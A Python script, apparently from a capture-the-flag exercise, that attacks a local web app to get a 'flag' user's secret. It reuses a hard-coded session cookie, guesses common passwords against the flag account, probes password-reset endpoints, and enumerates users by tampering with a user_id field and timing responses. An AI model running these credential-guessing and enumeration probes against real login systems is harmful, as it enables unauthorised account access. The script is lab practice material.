import requests
import re
from urllib.parse import urlencode

BASE_URL = "http://127.0.0.1:33029"
SESSION_COOKIE = "eyJ1c2VyX2lkIjoxMDAzMn0.ac6Z5w.L4Dx_bmHgYdRTXc80ol3P3GoeoY"

session = requests.Session()
session.cookies.set("session", SESSION_COOKIE)

print("=" * 80)
print("FINAL ATTEMPS - Different Techniques")
print("=" * 80)

# Check the raw response bytes for hidden data
print("\n[1] Check raw response for hidden characters/encoding")
print("-" * 80)

r = session.get(f"{BASE_URL}/password/flag")
print(f"Response length: {len(r.text)} bytes")
print(f"Welcome message: {re.search(r'Welcome, ([^!<]+)', r.text).group(1).strip() if re.search(r'Welcome, ([^!<]+)', r.text) else 'N/A'}")

# Look for hidden span elements, comments, etc.
hidden_spans = re.findall(r'<span[^>]+style=["\'][^"\']*display:\s*none[^"\']*["\'][^>]*>([^<]*)</span>', r.text, re.I)
if hidden_spans:
    print(f"Hidden spans: {hidden_spans}")

# Look for JavaScript variables that might contain data
js_vars = re.findall(r'(?:var|let|const)\s+(\w+)\s*=\s*["\']([^"\']+)["\']', r.text)
print(f"JavaScript variables: {js_vars}")

# Check for base64 encoded data
base64_pattern = r'[A-Za-z0-9+/]{20,}={0,2}'
base64_candidates = re.findall(base64_pattern, r.text)
if base64_candidates:
    print(f"\nBase64 candidates found: {len(base64_candidates)}")
    for candidate in base64_candidates[:5]:
        print(f"  Trying to decode: {candidate[:50]}...")
        try:
            import base64
            decoded = base64.b64decode(candidate)
            print(f"    Decoded: {decoded[:100]}")
        except:
            pass

print("\n" + "=" * 80)
print("[2] Try to trigger password reset for flag user")
print("=" * 80)

# Check if there's a password reset or forgot password endpoint
reset_endpoints = [
    '/forgot', '/forgot-password', '/reset-password',
    '/password/reset', '/recover', '/recovery'
]

for endpoint in reset_endpoints:
    try:
        r = session.get(f"{BASE_URL}{endpoint}", timeout=3)
        if r.status_code != 404:
            print(f"\n{endpoint}: Status {r.status_code}")
            print(f"Response:\n{r.text[:1000]}")
    except:
        pass

print("\n" + "=" * 80)
print("[3] Check if accessing /password/flag changes session context")
print("=" * 80)

# Visit /password/flag and then check dashboard
r1 = session.get(f"{BASE_URL}/password/flag")
print(f"/password/flag response cookies: {dict(r1.cookies)}")

r2 = session.get(f"{BASE_URL}/dashboard")
welcome = re.search(r'Welcome, ([^!<]+)', r2.text)
print(f"Dashboard after /password/flag: {welcome.group(1).strip() if welcome else 'N/A'}")

print("\n" + "=" * 80)
print("[4] Try authentication with flag user's credentials via standard login")
print("=" * 80)

# Try the main login form with flag user
login_passwords = ['flag', 'Flag', 'FLAG', 'password', '123456']

for pwd in login_passwords:
    form_data = {'username': 'flag', 'password': pwd}
    r = session.post(f"{BASE_URL}/password/test", data=urlencode(form_data), 
                     headers={'Content-Type': 'application/x-www-form-urlencoded'},
                     allow_redirects=True)
    
    if "FLAG{" in r.text:
        print(f"\n[!] FLAG FOUND with password: {pwd}")
        print(f"Response:\n{r.text}")
        break
    elif "Welcome, Flag" in r.text:
        print(f"\n[!] Successfully logged in as flag user with password: {pwd}")
        print(f"Response:\n{r.text[:2000]}")
        # Check dashboard
        d = session.get(f"{BASE_URL}/dashboard")
        print(f"\nDashboard after login:\n{d.text}")
        break
    elif "Incorrect password" in r.text or "User not found" in r.text:
        print(f"[X] Password '{pwd}': Failed")
    else:
        print(f"[?] Password '{pwd}': Status {r.status_code}, length {len(r.text)}")

print("\n" + "=" * 80)
print("[5] Check for timing differences")
print("=" * 80)

import time

# Time requests with different user_ids to see if there's a timing leak
for user_id in [10032, 10052, 99999]:
    form_data = {'username': 'test', 'password': 'wrong', 'user_id': str(user_id)}
    start = time.time()
    r = session.post(f"{BASE_URL}/password/test", data=urlencode(form_data), 
                     headers={'Content-Type': 'application/x-www-form-urlencoded'})
    elapsed = time.time() - start
    print(f"user_id={user_id}: {elapsed:.4f}s")

print("\n" + "=" * 80)
print("[6] Try to enumerate all users via time-based or error-based feedback")
print("=" * 80)

# Check if there's different behavior for existing vs non-existing users
for user_id in [10030, 10031, 10032, 10033, 10052, 10000]:
    form_data = {'username': 'test', 'password': 'test', 'user_id': str(user_id)}
    r = session.post(f"{BASE_URL}/password/test", data=urlencode(form_data))
    
    # Check if response has useful indicators
    has_john_doe = "John Doe" in r.text
    has_flag = "Flag" in r.text
    error_msg = re.search(r'alert alert-(\w+)[^>]*>([^<]+)', r.text)
    error_text = error_msg.group(2).strip() if error_msg else "None"
    
    print(f"user_id={user_id}: John Doe={has_john_doe}, Flag={has_flag}, Error='{error_text}'")

print("\n[FINAL ATTEMPTS COMPLETE]")

